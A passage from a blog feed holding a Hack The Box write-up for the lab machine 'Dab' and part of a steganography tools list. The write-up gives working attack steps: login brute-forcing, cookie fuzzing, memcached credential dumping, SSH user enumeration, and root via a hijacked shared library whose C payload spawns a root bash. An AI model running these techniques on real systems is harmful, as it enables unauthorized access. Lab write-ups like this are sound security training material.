&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-gets-us-a-root-shell-then-immediately-dies-after-the-first-command-we-got-trolled-again-d&quot;&gt;It gets us a root shell then immediately dies after the first command. We got trolled again :D&lt;/h4&gt;
&lt;h4 id=&quot;find---perm--4000-to-search-for-suid-binaries-and-we-see-something-unusual&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -4000&lt;/code&gt; to search for suid binaries and we see something unusual.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;a-binary-called-myexec-has-suid-permissions-lets-see-whats-that&quot;&gt;A binary called &lt;code class=&quot;highlighter-rouge&quot;&gt;myexec&lt;/code&gt; has suid permissions. Let’s see what’s that.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-a-password-and-of-course-test-is-refused--we-need-to-reverse-engineer-this-binary-to-find-the-password&quot;&gt;It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;getting-the-password&quot;&gt;Getting the password&lt;/h3&gt;
&lt;h4 id=&quot;scp-genevievedabhtbusrbinmyexec-rootdesktophtbboxesdab-to-download-the-file-on-our-box&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab&lt;/code&gt; to download the file on our box&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-radare2&quot;&gt;Then we will use radare2&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;radare2 myexec&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;aaa&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;pdf @ main&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-s3cur3l0g1n--lets-get-back-to-the-box-and-try-it&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;s3cur3l0g1n&lt;/code&gt; , let’s get back to the box and try it&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get&quot;&gt;And we get:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;password is correct 
seclogin() called
TODO: Placeholder for now, function not implemented yet
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-what-can-we-do-now-&quot;&gt;so what can we do now ?&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;hijacking-dynamically-linked-shared-object-library-and-getting-root&quot;&gt;Hijacking dynamically linked shared object library and getting root&lt;/h3&gt;
&lt;h4 id=&quot;if-we-run-ldd-list-dynamic-dependencies-against-that-binary-we-see-libsecloginso&quot;&gt;If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-saw-earlier-when-we-executed-the-binary--seclogin-called&quot;&gt;and we saw earlier when we executed the binary : &lt;code class=&quot;highlighter-rouge&quot;&gt;seclogin() called&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-theoretically--if-we-can-replace-libsecloginso-with-another-one-and-link-to-it--the-binary-will-execute-it-as-root-lets-test-that&quot;&gt;So theoretically , if we can replace &lt;code class=&quot;highlighter-rouge&quot;&gt;libseclogin.so&lt;/code&gt; with another one and link to it , the binary will execute it as root. let’s test that.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-create-a-directory-in-homegenevieve-and-call-it-exploit&quot;&gt;We will create a directory in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/genevieve/&lt;/code&gt; and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;.exploit&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-will-write-a-small-c-program-that-spawns-bash&quot;&gt;Then we will write a small c program that spawns bash.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

seclogin() {
setgid(0);
setuid(0);
system(&quot;/bin/bash&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-compile-it&quot;&gt;After that we will compile it&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -o libseclogin.so exploit.c&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-our-fake-libsecloginso-is-ready--we-need-to-make-the-system-point-to-our-path-homegenevieveexploitlibsecloginso-instead-of-usrliblibsecloginso&quot;&gt;Now our fake &lt;code class=&quot;highlighter-rouge&quot;&gt;libseclogin.so&lt;/code&gt; is ready , we need to make the system point to our path &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/genevieve/.exploit/libseclogin.so&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/lib/libseclogin.so&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-will-cd-to-etcldsoconfd--and-create-a-conf-file-and-put-our-path-in-it&quot;&gt;We will &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ld.so.conf.d&lt;/code&gt; , and create a &lt;code class=&quot;highlighter-rouge&quot;&gt;.conf&lt;/code&gt; file and put our path in it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-to-activate-that-path-we-will-execute-this-command-ldconfig&quot;&gt;Then to activate that path we will execute this command &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;this-page-helped-a-lot&quot;&gt;&lt;a href=&quot;https://www.cyberciti.biz/faq/linux-setting-changing-library-path/&quot;&gt;This page&lt;/a&gt; helped a lot.&lt;/h4&gt;
&lt;h4 id=&quot;lets-do-ldd-again&quot;&gt;Let’s do &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; again:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/dab/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-path-changed-and-pointed-to-our-fake-library&quot;&gt;The path changed and pointed to our fake library.&lt;/h4&gt;
&lt;h4 id=&quot;lets-own-root&quot;&gt;Let’s own root.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./myexec&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/dab/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root&quot;&gt;And we owned root.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---secnotes&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/secnotes/&quot;&gt;Hack The Box - Secnotes&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---ypuffy&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ypuffy/&quot;&gt;Hack The Box - Ypuffy&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login succeeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&amp;gt; attack –&amp;gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&amp;gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to get a more clear output cat users.txt | python -m json.tool &amp;gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d '&quot;' -f 2 &amp;gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d '&quot;' -f 2 &amp;gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &amp;lt;stdio.h&amp;gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Secnotes Next Hack The Box write-up : Hack The Box - Ypuffy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/dab/0.png" /></entry><entry><title type="html">Steganography - A list of useful tools and resources</title><link href="http://localhost:4000/lists/stego/" rel="alternate" type="text/html" title="Steganography - A list of useful tools and resources" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/lists/stego</id><content type="html" xml:base="http://localhost:4000/lists/stego/">&lt;hr /&gt;

&lt;h3 id=&quot;steganography&quot;&gt;Steganography&lt;/h3&gt;
&lt;h4 id=&quot;steganography-is-hiding-a-file-or-a-message-inside-of-another-file--there-are-many-fun-steganography-ctf-challenges-out-there-where-the-flag-is-hidden-in-an-image--audio-file-or-even-other-types-of-files-here-is-a-list-of-the-most-tools-i-use-and-some-other-useful-resources&quot;&gt;Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources.&lt;/h4&gt;
&lt;h4 id=&quot;note--this-list-will-be-updated-regularly--feel-free-to-pm-if-you-have-any-suggestions&quot;&gt;Note : This list will be updated regularly , feel free to pm if you have any suggestions&lt;/h4&gt;
&lt;h4 id=&quot;last-update--2912019&quot;&gt;Last update : 29.1.2019&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/lists/stego/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;steghide&quot;&gt;Steghide&lt;/h3&gt;
&lt;h4 id=&quot;steghide-is-a-steganography-program-that-hides-data-in-various-kinds-of-image-and-audio-files--only-supports-these-file-formats--jpeg-bmp-wav-and-au-but-its-also-useful-for-extracting-embedded-and-encrypted-data-from-other-files&quot;&gt;Steghide is a steganography program that hides data in various kinds of image and audio files , only supports these file formats : &lt;code class=&quot;highlighter-rouge&quot;&gt;JPEG, BMP, WAV and AU&lt;/code&gt;. but it’s also useful for extracting embedded and encrypted data from other files.&lt;/h4&gt;
&lt;h4 id=&quot;it-can-be-installed-with-apt-however-the-source-can-be-found-on-github&quot;&gt;It can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; however the &lt;a href=&quot;https://github.com/StefanoDeVuono/steghide&quot;&gt;source&lt;/a&gt; can be found on github.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;steghide-info-file--displays-info-about-a-file-whether-it-has-embedded-data-or-not&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide info file&lt;/code&gt; : displays info about a file whether it has embedded data or not.&lt;/h4&gt;
&lt;h4 id=&quot;steghide-extract--sf-file--extracts-embedded-data-from-a-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide extract -sf file&lt;/code&gt; : extracts embedded data from a file&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;foremost&quot;&gt;Foremost&lt;/h3&gt;
&lt;h4 id=&quot;foremost-is-a-program-that-recovers-files-based-on-their-headers--footers-and-internal-data-structures--i-find-it-useful-when-dealing-with-png-images&quot;&gt;Foremost is a program that recovers files based on their headers , footers and internal data structures , I find it useful when dealing with png images.&lt;/h4&gt;
&lt;h4 id=&quot;it-can-be-installed-with-apt-however-the-source-can-be-found-on-github-1&quot;&gt;It can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; however the &lt;a href=&quot;https://github.com/korczis/foremost&quot;&gt;source&lt;/a&gt; can be found on github.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-1&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;foremost--i-file--extracts-data-from-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;foremost -i file&lt;/code&gt; : extracts data from the given file.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stegsolve&quot;&gt;Stegsolve&lt;/h3&gt;
&lt;h4 id=&quot;sometimes-there-is-a-message-or-a-text-hidden-in-the-image-itself-and-in-order-to-view-it-you-need-to-apply-some-color-filters-or-play-with-the-color-levels-you-can-do-it-with-gimp-or-photoshop-or-any-other-image-editing-software-but-stegsolve-made-it-easier-its-a-small-java-tool-that-applies-many-color-filters-on-images-personally-i-find-it-very-useful&quot;&gt;Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images. Personally i find it very useful&lt;/h4&gt;
&lt;h4 id=&quot;you-can-get-it-from-github&quot;&gt;You can get it from &lt;a href=&quot;https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve&quot;&gt;github&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;strings&quot;&gt;Strings&lt;/h3&gt;
&lt;h4 id=&quot;strings-is-a-linux-tool-that-displays-printable-strings-in-a-file-that-simple-tool-can-be-very-helpful-when-solving-stego-challenges-usually-the-embedded-data-is-password-protected-or-encrypted-and-sometimes-the-password-is-actaully-in-the-file-itself-and-can-be-easily-viewed-by-using-strings&quot;&gt;Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings&lt;/h4&gt;
&lt;h4 id=&quot;its-a-default-linux-tool-so-you-dont-need-to-install-anything&quot;&gt;It’s a default linux tool so you don’t need to install anything.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-2&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;strings-file--displays-printable-strings-in-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings file&lt;/code&gt; : displays printable strings in the given file.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exiftool&quot;&gt;Exiftool&lt;/h3&gt;
&lt;h4 id=&quot;sometimes-important-stuff-is-hidden-in-the-metadata-of-the-image-or-the-file--exiftool-can-be-very-helpful-to-view-the-metadata-of-the-files&quot;&gt;Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files.&lt;/h4&gt;
&lt;h4 id=&quot;you-can-get-it-from-here&quot;&gt;You can get it from &lt;a href=&quot;https://www.sno.phy.queensu.ca/~phil/exiftool/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-3&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;exiftool-file--shows-the-metadata-of-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool file&lt;/code&gt; : shows the metadata of the given file&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exiv2&quot;&gt;Exiv2&lt;/h3&gt;
&lt;h4 id=&quot;a-tool-similar-to-exiftool&quot;&gt;A tool similar to exiftool.&lt;/h4&gt;
&lt;h4 id=&quot;it-can-be-installed-with-apt-however-the-source-can-be-found-on-github-2&quot;&gt;It can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; however the &lt;a href=&quot;https://github.com/Exiv2/exiv2&quot;&gt;source&lt;/a&gt; can be found on github.&lt;/h4&gt;
&lt;h4 id=&quot;official-website&quot;&gt;&lt;a href=&quot;http://www.exiv2.org/&quot;&gt;Official website&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-4&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;exiv2-file--shows-the-metadata-of-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exiv2 file&lt;/code&gt; : shows the metadata of the given file&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;binwalk&quot;&gt;Binwalk&lt;/h3&gt;
&lt;h4 id=&quot;binwalk-is-a-tool-for-searching-binary-files-like-images-and-audio-files-for-embedded-files-and-data&quot;&gt;Binwalk is a tool for searching binary files like images and audio files for embedded files and data.&lt;/h4&gt;
&lt;h4 id=&quot;it-can-be-installed-with-apt-however-the-source-can-be-found-on-github-3&quot;&gt;It can be installed with &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; however the &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;source&lt;/a&gt; can be found on github.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-5&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;binwalk-file--displays-the-embedded-data-in-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk file&lt;/code&gt; : Displays the embedded data in the given file&lt;/h4&gt;
&lt;h4 id=&quot;binwalk--e-file--displays-and-extracts-the-data-from-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk -e file&lt;/code&gt; : Displays and extracts the data from the given file&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;zsteg&quot;&gt;Zsteg&lt;/h3&gt;
&lt;h4 id=&quot;zsteg-is-a-tool-that-can-detect-hidden-data-in-png-and-bmp-files&quot;&gt;zsteg is a tool that can detect hidden data in png and bmp files.&lt;/h4&gt;
&lt;h4 id=&quot;to-install-it--gem-install-zsteg--the-source-can-be-found-on-github&quot;&gt;to install it : &lt;code class=&quot;highlighter-rouge&quot;&gt;gem install zsteg&lt;/code&gt; , The source can be found on &lt;a href=&quot;https://github.com/zed-0xff/zsteg&quot;&gt;github&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-6&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;zsteg--a-file--runs-all-the-methods-on-the-given-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;zsteg -a file&lt;/code&gt; : Runs all the methods on the given file&lt;/h4&gt;
&lt;h4 id=&quot;zsteg--e-file--extracts-data-from-the-given-payload-example--zsteg--e-b4bgrmsbxy-namepng&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;zsteg -E file&lt;/code&gt; : Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;wavsteg&quot;&gt;Wavsteg&lt;/h3&gt;
&lt;h4 id=&quot;wavsteg-is-a-python3-tool-that-can-hide-data-and-files-in-wav-files-and-can-also-extract-data-from-wav-files&quot;&gt;WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files.&lt;/h4&gt;
&lt;h4 id=&quot;you-can-get-it-from-github-1&quot;&gt;You can get it from &lt;a href=&quot;https://github.com/ragibson/Steganography#WavSteg&quot;&gt;github&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;useful-commands-7&quot;&gt;Useful commands:&lt;/h4&gt;
&lt;h4 id=&quot;python3-wavstegpy--r--s-soundfile--o-outputfile--extracts-data-from-a-wav-sound-file-and-outputs-the-data-into-a-new-file&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 WavSteg.py -r -s soundfile -o outputfile&lt;/code&gt; : extracts data from a wav sound file and outputs the data into a new file&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sonic-visualizer&quot;&gt;Sonic visualizer&lt;/h3&gt;
